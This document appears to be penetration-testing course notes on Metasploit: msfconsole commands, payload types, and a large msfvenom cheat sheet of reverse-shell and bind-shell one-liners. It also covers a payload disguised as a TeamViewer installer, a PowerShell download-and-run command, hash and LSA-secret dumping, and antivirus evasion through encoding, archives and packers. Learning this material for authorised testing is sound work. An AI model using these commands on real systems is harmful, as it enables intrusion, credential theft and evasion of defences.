- Modules Path:`/usr/share/metasploit-framework/modules`
- Type of modules
  - auxiliary
  - encoders
  - evasion
  - exploits
  - nops
  - payloads
  - post
- Plugins: `ls /usr/share/metasploit-framework/plugins/`
- Scripts: `ls /usr/share/metasploit-framework/scripts/`
- Tools: `ls /usr/share/metasploit-framework/tools/`

Update metasploit: `sudo apt update && sudo apt install metasploit-framework`

![](https://academy.hackthebox.com/storage/modules/39/S04_SS03.png)

Syntax: `<No.> <type>/<os>/<service>/<name>`

| Type | Description |
| --- | --- |
| Auxiliary | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| Encoders | Ensure that payloads are intact to their destination. |
| Exploits | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
| NOPs | (No Operation code) Keep the payload sizes consistent across exploit attempts. |
| Payloads | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| Plugins | Additional scripts can be integrated within an assessment with msfconsole and coexist. |
| Post | Wide array of modules to gather information, pivot deeper, etc. |

The Service tag refers to the vulnerable service that is running on the target machine. 

Finally, the Name tag explains the actual action that can be performed using this module created for a specific purpose.

## Important Commands

| Command | Functionality |
| --- | --- |
| help search | Display help for the search command. |
| search [<options>] [<keywords>] | Search for modules based on keywords and options. |
| use <module> | Select a specific module for use. |
| show options | Display options and their current settings. |
| set <option> <value> | Set the value of a module option. |
| setg <option> <value> | Set a global (persistent) value for an option. |
| info | Display detailed information about the selected module. |
| run | Execute the selected module against the target. |
| sessions | List all active sessions. |
| sessions -i <session_id> | Interact with a specific session. |
| shell | Open a system shell on the target after successful exploitation. |
| background | Background the current session. |
| exit | Exit the msfconsole. |

## Targets

Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system. 

`msf6 > show targets`

`msf6 exploit(windows/browser/ie_execcommand_uaf) > info`

`msf6 exploit(windows/browser/ie_execcommand_uaf) > options`

## Payloads

1. Singles: These payloads contain both the exploit and the entire shellcode necessary for the task. They are stable and straightforward to use, but their size can sometimes cause issues with certain exploits. Singles are executed on the target system independently and provide immediate results, such as adding a user or starting a process.
2. Stagers: Stagers are smaller payloads designed to set up a network connection between the attacker and the victim. They wait on the attacker's machine and connect to the victim host once the Stage payload completes its run on the target system. Stagers are reliable and used to ensure successful communication between the attacker and the compromised system.
3. Stages: Stages are payload components that are downloaded by Stager modules. They offer advanced features with no size limits, including tools like Meterpreter and VNC Injection. Stages are beneficial for handling large payloads and overcoming issues with data transfer. They follow a process where the Stager receives the middle Stager, and the middle Stager performs a full download, making them more efficient for certain tasks.

`show payloads`

`msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15`

| Payload | Description |
| --- | --- |
| generic/custom | Generic listener, multi-use |
| generic/shell_bind_tcp | Generic listener, multi-use, normal shell, TCP connection binding |
| generic/shell_reverse_tcp | Generic listener, multi-use, normal shell, reverse TCP connection |
| windows/x64/exec | Executes an arbitrary command (Windows x64) |
| windows/x64/loadlibrary | Loads an arbitrary x64 library path |
| windows/x64/messagebox | Spawns a dialog via MessageBox using a customizable title, text & icon |
| windows/x64/shell_reverse_tcp | Normal shell, single payload, reverse TCP connection |
| windows/x64/shell/reverse_tcp | Normal shell, stager + stage, reverse TCP connection |
| windows/x64/shell/bind_ipv6_tcp | Normal shell, stager + stage, IPv6 Bind TCP stager |
| windows/x64/meterpreter/$ | Meterpreter payload + varieties above |
| windows/x64/powershell/$ | Interactive PowerShell sessions + varieties above |
| windows/x64/vncinject/$ | VNC Server (Reflective Injection) + varieties above |

## Encoders

Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion.

`Encoders` come into play with the role of changing the payload to run on different operating systems and architectures.

- **`x64`**
- **`x86`**
- **`sparc`**
- **`ppc`**
- **`mips`**

Shikata Ga Nai (SGN) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. 

`[!bash!]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`

`-e x86/shikata_ga_nai`

`msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders`

`[!bash!]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe`

`-i 10`

## Analyze with Virustotal

`[!bash!]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe`

## Databases

```
Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
```

## Workspaces

```
Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information
```

## Nmap inside msfconsole

```
msf6 > db_nmap -sV -sS 10.10.10.8
msf6 > hosts
msf6 > services
```

**Note**: You can also export data with `db_export` so you can import later

## Install Plugins

To install new custom plugins not included in new updates of the distro, we can take the .rb file provided on the maker's page and place it in the folder at /usr/share/metasploit-framework/plugins with the proper permissions.

| https://nmap.org/ | https://sectools.org/tool/nexpose/ | https://www.tenable.com/products/nessus |
| --- | --- | --- |
| http://blog.gentilkiwi.com/mimikatz | https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi | https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation |
| https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb | https://www.offensive-security.com/metasploit-unleashed/fun-incognito/ | https://github.com/darkoperator/Metasploit-Plugins |

## Mixins

Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes. Thus, it would be deemed inappropriate to call it inheritance but rather inclusion.

1. Want to provide a lot of optional features for a class.
2. Want to use one particular feature for a multitude of classes

## Sesions

This can be done either by pressing the `[CTRL] + [Z]` key combination or by typing the `background` command in the case of Meterpreter stages.

**Listing Active Sessions**:`msf6 exploit(windows/smb/psexec_psh) > sessions`

**Interacting with a Session**:`msf6 exploit(windows/smb/psexec_psh) > sessions -i 1`

## Jobs

we would need to use the `jobs` command to look at the currently active tasks running in the background and terminate the old ones to free up the port.

When we run an exploit, we can run it as a job by typing `exploit -j`

To kill a specific job, look at the index no. of the job and use the kill [index no.] command. Use the jobs -K command to kill all running jobs.

## Meterpreter

```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
meterpreter > hashdump
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```

## Import Modules

```
msf6> loadpath /usr/share/metasploit-framework/modules/
msf6> reload_all
use [module-path]
```

## Msfvenom [[Shells & Payloads]]

MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.

`XeroCyb3r@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx`

| MSFVenom Payload Generation One-Liner                                                                                                                                                                                     | Description                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| msfvenom -l   payloads                                                                                                                                                                                                    | List available payloads                          |
| msfvenom -p PAYLOAD --list-options                                                                                                                                                                                        | List payload options                             |
| msfvenom -p   PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT   LHOST=IP                                                                                                                                                     | Payload Encoding                                 |
| msfvenom -p   linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf  >  shell.elf                                                                                                                                  | Linux Meterpreter  reverse shell x86 multi stage |
| msfvenom -p   linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf  >  shell.elf                                                                                                                                     | Linux Meterpreter  bind shell x86 multi stage    |
| msfvenom -p linux/x64/shell_bind_tcp   RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                             | Linux bind shell x64 single stage                |
| msfvenom -p linux/x64/shell_reverse_tcp   RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                          | Linux reverse shell x64 single stage             |
| msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe                                                                                                                                    | Windows Meterpreter reverse shell                |
| msfvenom -p   windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe | Windows Meterpreter http reverse shell           |
| msfvenom -p   windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe >   shell.exe                                                                                                                                      | Windows Meterpreter bind shell                   |
| msfvenom -p   windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe                                                                                                                                          | Windows CMD Multi Stage                          |
| msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT   -f exe >  shell.exe                                                                                                                                           | Windows CMD Single Stage                         |
| msfvenom -p   windows/adduser USER=hacker PASS=password -f exe > useradd.exe                                                                                                                                              | Windows add user                                 |
| msfvenom -p   osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho >   shell.macho                                                                                                                                      | Mac Reverse Shell                                |
| msfvenom -p   osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho  >  shell.macho                                                                                                                                         | Mac Bind shell                                   |
| msfvenom -p   cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw >   shell.py                                                                                                                                             | Python Shell                                     |
| msfvenom -p   cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw >   shell.sh                                                                                                                                               | BASH Shell                                       |
| msfvenom -p   cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw >   shell.pl                                                                                                                                               | PERL Shell                                       |
| msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp >   shell.asp                                                                                                                                    | ASP Meterpreter shell                            |
| msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw  >  shell.jsp                                                                                                                                         | JSP Shell                                        |
| msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war >   shell.war                                                                                                                                         | WAR Shell                                        |
| msfvenom -p   php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw  >  shell.php   cat shell.php                                                                                                                        | pbcopy && echo '?php '                           |
| msfvenom -p   php/reverse_php LHOST=IP LPORT=PORT -f raw  >  phpreverseshell.php                                                                                                                                          | Php Reverse Shell                                |
| msfvenom -a x86   --platform Windows -p windows/exec CMD="powershell \\"IEX(New-Object   Net.webClient).downloadString('http://IP/nishang.ps1')\""   -f python                                                            | Windows Exec Nishang Powershell in   python      |
| msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b "\x04\xA0"                                                                                                   | Bad characters shikata_ga_nai                    |
| msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                                                                      | Bad characters fnstenv_mov                       |


## **Evasion Techniques***

1. **Signature-Based Evasion**: Most anti-virus software relies on signature-based detection, which involves matching known patterns of malicious code. Evasion techniques aim to bypass these signatures to avoid detection.
2. **Payload Encoding**: Encoding payloads using various encoding schemes with multiple iterations is a common evasion method. However, this is not always sufficient to bypass all anti-virus products.
3. **Communication Channel**: Establishing a communication channel between the attacker and the victim can raise alarms with intrusion detection and prevention systems (IDS/IPS). This method may be detected due to suspicious network activity.
4. **AES-Encrypted Communication**: With tools like MSF6, attackers can tunnel AES-encrypted communication from Meterpreter shells back to the attacker's host, effectively encrypting the traffic and evading network-based IDS/IPS.
5. **IP Address Filtering**: Some strict network rulesets may flag connections based on the sender's IP address. To evade this, attackers may try to find services that are allowed through the network's filters.
6. **DNS Exfiltration**: In cases like the Equifax hack of 2017, attackers abused vulnerabilities to access critical data servers and used DNS exfiltration techniques to slowly transfer data without detection for an extended period.
7. **Payload Fingerprinting**: Anti-virus software can detect payloads by their signature, and even tools like msfconsole may have their code and files added to signature databases. This can result in the immediate blocking of default payloads.

`XeroCyb3r@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5`

```XeroCyb3r@htb[/htb]$ rar a ~/test.rar -p ~/test.js
XeroCyb3r@htb[/htb]$ mv test.rar test
XeroCyb3r@htb[/htb]$ rar a test2.rar -p test
XeroCyb3r@htb[/htb]$ mv test2.rar test2
```

`XeroCyb3r@htb[/htb]$ msf-virustotal -k <API key> -f test2`

## Packers

The term Packer refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file.

| https://upx.github.io/ | https://enigmaprotector.com/ | https://www.matcode.com/mpress.htm |
| ---------------------- | ---------------------------- | ---------------------------------- |
| Alternate EXE Packer   | ExeStealth                   | Morphine                           |
| MEW                    | Themida                      |                                    |

Intrusion Prevention Systems and Antivirus Engines are the most common defender tools that can shoot down an initial foothold on the target. These mainly function on signatures of the whole malicious file or the stub stage.
